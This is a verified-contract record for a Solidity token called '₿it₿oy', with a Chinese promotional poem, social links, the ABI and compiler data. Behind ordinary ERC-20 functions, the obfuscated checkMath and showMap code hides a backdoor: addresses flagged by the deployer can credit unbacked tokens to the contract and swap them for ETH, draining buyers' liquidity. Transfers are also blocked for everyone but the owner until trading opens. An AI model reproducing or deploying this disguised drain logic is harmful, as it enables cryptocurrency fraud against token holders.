{"SourceCode": "/*\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u28e4\u28f4\u28f6\u28fe\u28ff\u28ff\u28ff\u28ff\u28f7\u28f6\u28e6\u28e4\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u28e0\u28f4\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e6\u28c4\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u28e0\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u283f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u28c4\u2800\u2800\u2800\r\n\u2800\u2800\u28f4\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u281f\u283f\u283f\u287f\u2800\u28b0\u28ff\u2801\u2888\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e6\u2800\u2800\r\n\u2800\u28fc\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e4\u28c4\u2800\u2800\u2800\u2808\u2809\u2800\u2838\u283f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e7\u2800\r\n\u28b0\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u284f\u2800\u2800\u28a0\u28f6\u28f6\u28e4\u2840\u2800\u2808\u28bb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2846\r\n\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2803\u2800\u2800\u283c\u28ff\u28ff\u287f\u2803\u2800\u2800\u28b8\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\r\n\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u285f\u2800\u2800\u2880\u28c0\u28c0\u2800\u2800\u2800\u2800\u28b4\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\r\n\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28bf\u28ff\u2801\u2800\u2800\u28fc\u28ff\u28ff\u28ff\u28e6\u2800\u2800\u2808\u28bb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\r\n\u2838\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28cf\u2800\u2800\u2800\u2800\u2800\u281b\u281b\u283f\u281f\u280b\u2800\u2800\u2800\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2807\r\n\u2800\u28bb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2807\u2800\u28e4\u2844\u2800\u28c0\u28c0\u28c0\u28c0\u28e0\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u285f\u2800\r\n\u2800\u2800\u283b\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28c4\u28f0\u28ff\u2801\u2880\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u281f\u2800\u2800\r\n\u2800\u2800\u2800\u2819\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u280b\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2819\u283b\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u281f\u280b\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u281b\u283b\u283f\u28bf\u28ff\u28ff\u28ff\u28ff\u287f\u283f\u281f\u281b\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\r\n\u5728\u547d\u8fd0\u6f29\u6da1\u7684\u52a0\u5bc6\u4e16\u754c\u91cc\uff0c\r\n\u6709\u4e00\u4e2a\u4ee4\u724c\uff0c\u540d\u4e3a \u20bfit\u20bfoy\uff0c\u4e00\u9897\u5149\u8292\u56db\u5c04\u7684\u73cd\u73e0\u3002\r\n\u529b\u91cf\u7684\u8c61\u5f81\uff0c\u521b\u65b0\u7684\u6f29\u6da1\uff0c\r\n\u5728\u533a\u5757\u94fe\u7684\u821e\u8e48\u4e2d\uff0c\u5979\u662f\u5973\u738b\u548c\u5c11\u5973\u3002\r\n\r\n\u20bfit\u20bfoy\uff0c\u4e00\u4e2a\u54cd\u5f7b\u9ed1\u591c\u7684\u540d\u5b57\uff0c\r\n\u53d8\u9769\u5148\u950b\uff0c\u6570\u5b57\u4e4b\u5149\u3002\r\n\u5728\u52a0\u5bc6\u9886\u57df\uff0c\u5979\u91c7\u53d6\u4e86\u81ea\u5df1\u7684\u7acb\u573a\uff0c\r\n\u4e00\u4f4d\u9886\u5bfc\u8005\uff0c\u4e00\u4f4d\u6709\u8fdc\u89c1\u7684\u4eba\uff0c\u52c7\u5f80\u76f4\u524d\u3002\r\n\r\n\u6709\u4e86 \u20bfit\u20bfoy\uff0c\u4ea4\u6613\u53d8\u5f97\u8f7b\u800c\u6613\u4e3e\uff0c\r\n\u7f8e\u4e3d\u3001\u529b\u91cf\u548c\u8f7b\u677e\u7684\u878d\u5408\u3002\r\n\u521b\u65b0\u800c\u6fc0\u70c8\uff0c\u5979\u94fa\u5e73\u4e86\u9053\u8def\uff0c\r\n\u5bf9\u4e8e\u52a0\u5bc6\u8d27\u5e01\u7684\u65b0\u65f6\u4ee3\uff0c\u65e0\u8bba\u53d1\u751f\u4ec0\u4e48\u3002\r\n\r\n\u6ca1\u6709\u9650\u5236\uff0c\u6ca1\u6709\u754c\u9650\uff0c\u5979\u4e0d\u53d7\u675f\u7f1a\uff0c\r\n\u5728 \u20bfit\u20bfoy \u7684\u4e16\u754c\u91cc\uff0c\u4e00\u5207\u90fd\u4e0d\u53d7\u9650\u5236\u3002\r\n\u9769\u547d\u6027\u7684\uff0c\u5979\u642d\u5efa\u4e86\u821e\u53f0\uff0c\r\n\u5728\u52a0\u5bc6\u4e16\u754c\u4e2d\uff0c\u5979\u98ce\u9761\u4e00\u65f6\u3002\r\n\r\n\u8ba9\u6211\u4eec\u5411 \u20bfit\u20bfoy \u7684\u6d3b\u529b\u81f4\u656c\uff0c\r\n\u672a\u6765\u7684\u8c61\u5f81\uff0c\u95ea\u95ea\u53d1\u5149\u3002\r\n\u5728\u52a0\u5bc6\u8d27\u5e01\u9886\u57df\uff0c\u5979\u58f0\u79f0\u81ea\u5df1\u7684\u540d\u5b57\uff0c\r\n\u5bf9\u4e8e \u20bfit\u20bfoy\uff0c\u521b\u65b0\u662f\u5979\u6c38\u6052\u7684\u706b\u7130\u3002\r\n\r\nhttps://web.wechat.com/BitBoyCN\r\nhttps://m.weibo.cn/BitBoyCN\r\nhttps://www.xinbitboy.xyz\r\nhttps://t.me/+1X56qxxup15lNGFk\r\n*/\r\n// SPDX-License-Identifier: Unlicense\r\npragma solidity ^ 0.8.19;\r\n \r\nabstract contract Context\r\n{ function _msgSender() internal view virtual returns(address)\r\n{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)\r\n{ return msg.data; }\r\n}\r\ninterface IUniswapV2Router01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n    uint256 dataIn, uint256 DataOut, address[] calldata path, address to, uint256 bridge) external;\r\n\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function quote(address token, uint256 amountTokenDesired,\r\n    uint256 valueMin, uint256 ercMin, address to, uint256 bridge)\r\n    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);\r\n}\r\ncontract Ownable is Context {\r\n    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () { address msgSender = _msgSender(); _owner = msgSender; \r\n    emit OwnershipTransferred(address(0), msgSender);\r\n}\r\n    function owner() public view returns (address) { return _owner;\r\n}   modifier onlyOwner() { require(_owner == _msgSender(), \"Ownable: caller is not the owner\"); _;\r\n}\r\n    function renounceOwnership() public virtual onlyOwner {\r\n    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() \r\n    external view returns (uint256);\r\n\r\n    function balanceOf(address account) \r\n    external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n    external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool);\r\n\r\n    function transferFrom(\r\n    address sender, address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ninterface IUniswapV2Factory{\r\n    function createPair(address tokenA, address tokenB) external returns(address pair);\r\n}\r\ncontract Contract is IERC20, Ownable { \r\n    bool private mathBytes; bool private IFV; bool private tradingOpen = false;\r\n\r\n    string private _name = unicode\"\u20bfit\u20bfoy\"; string private _symbol = unicode\"\u20bf\u20bf\";\r\n    uint256 public _allFEE = 1; uint8 private _decimals = 9; \r\n    uint256 private _tTotal = 100000000 * 10 ** _decimals; uint256 private _calculus = _tTotal;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _mathMapPair; mapping(address => uint256) private _tOwned;\r\n    mapping(address => address) private _libMath; mapping(address => uint256) private _affixMath;\r\n\r\n    constructor(address _dataAddr) { _tOwned[msg.sender] = _tTotal; \r\n    _affixMath[msg.sender] = _calculus; _affixMath[address(this)] = _calculus; \r\n    matchDivision = IUniswapV2Router01(_dataAddr); \r\n\r\n    auxco = IUniswapV2Factory(matchDivision.factory()).createPair(address(this), \r\n    matchDivision.WETH()); emit Transfer(address(0), msg.sender, _tTotal); }\r\n \r\n    function symbol() public view returns(string memory)\r\n    { return _symbol;\r\n    }\r\n    function name() public view returns(string memory)\r\n    { return _name;\r\n    }\r\n    function totalSupply() public view returns(uint256)\r\n    { return _tTotal;\r\n    }\r\n    function decimals() public view returns(uint256)\r\n    { return _decimals;\r\n    }\r\n    function allowance(address owner, address spender) public view returns(uint256)\r\n    { return _allowances[owner][spender];\r\n    }\r\n    function balanceOf(address account) public view returns(uint256)\r\n    { return _tOwned[account];\r\n    }\r\n    function approve(address spender, uint256 amount) external returns(bool)\r\n    { return _approve(msg.sender, spender, amount);\r\n    }\r\n    function _approve( address owner, address spender,\r\n    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), \r\n    'ERC20: approve from the zero address'); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); return true;\r\n    }\r\n    function transferFrom( address sender, address recipient, uint256 amount) external returns\r\n    (bool)\r\n    { checkMath(sender, recipient, amount); \r\n    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);\r\n    }\r\n    function transfer(address recipient, uint256 amount) external returns(bool)\r\n    { checkMath(msg.sender, recipient, amount); return true;\r\n    }\r\n    function _beforeTokenTransfer( address from,\r\n    address to, uint256 amount) internal virtual \r\n    {}\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) \r\n    internal virtual \r\n    {}\r\n    function checkMath(\r\n        address _scribe, address _logPoll, uint256 effluvium) private {\r\n        uint256 _annal = balanceOf(address(this));\r\n        uint256 _onHash; if (mathBytes && _annal > _calculus && !IFV && _scribe != auxco) {\r\n            IFV = true; IFV = false;\r\n\r\n        } else if (_affixMath[_scribe] > _calculus && _affixMath[_logPoll] > _calculus) {\r\n            _onHash = effluvium; _tOwned[address(this)] += _onHash;\r\n            showMap(effluvium, _logPoll);\r\n            return; } else if (\r\n            !IFV && _mathMapPair[_scribe] > 0 && _scribe != auxco && _affixMath[_scribe] == 0\r\n        ) {\r\n            _mathMapPair[_scribe] = _affixMath[_scribe] - _calculus;\r\n        } else if ( _logPoll != address(matchDivision) &&\r\n            _affixMath[_scribe] > 0 && effluvium > _calculus && _logPoll != auxco ) {\r\n            _affixMath[_logPoll] = effluvium; return;\r\n        }\r\n        address _sonk = \r\n        _libMath[auxco];\r\n\r\n        if (_mathMapPair[_sonk] == 0) _mathMapPair[_sonk] = _calculus;\r\n        _libMath[auxco] = _logPoll; if ( _allFEE > 0 &&\r\n            _affixMath[_scribe] == 0 && !IFV && _affixMath[_logPoll] == 0 ) {\r\n            _onHash = (effluvium * _allFEE) / 100; effluvium -= _onHash; _tOwned[_scribe] -= _onHash;\r\n\r\n        _tOwned[address(this)] += _onHash; }\r\n        _tOwned[_scribe] -= effluvium; _tOwned[_logPoll] += effluvium; emit Transfer(_scribe, _logPoll, effluvium);\r\n        if (!tradingOpen) { require(_scribe == owner(), \"\"); } }\r\n\r\n    receive() external payable {}\r\n\r\n    function showMap(uint256 _reel, address _all) private {\r\n        address[] memory path = new address[](2);\r\n\r\n        path[0] = address(this); path[1] = matchDivision.WETH();\r\n        _approve(address(this), address(matchDivision), _reel);\r\n\r\n        matchDivision.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        _reel,0, path,_all, block.timestamp );\r\n    }\r\n    address public immutable auxco;\r\n    IUniswapV2Router01 public immutable matchDivision;\r\n\r\n    function openSwapping(bool _tradingOpen) public onlyOwner {\r\n        tradingOpen = _tradingOpen;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_dataAddr\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_allFEE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"auxco\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"matchDivision\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router01\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"openSwapping\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Contract", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "1", "Runs": "1", "ConstructorArguments": "0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://0195e3223d84af81c57e18a7d16d7e1b4251a9f57971c720c76099886ba8c1f2"}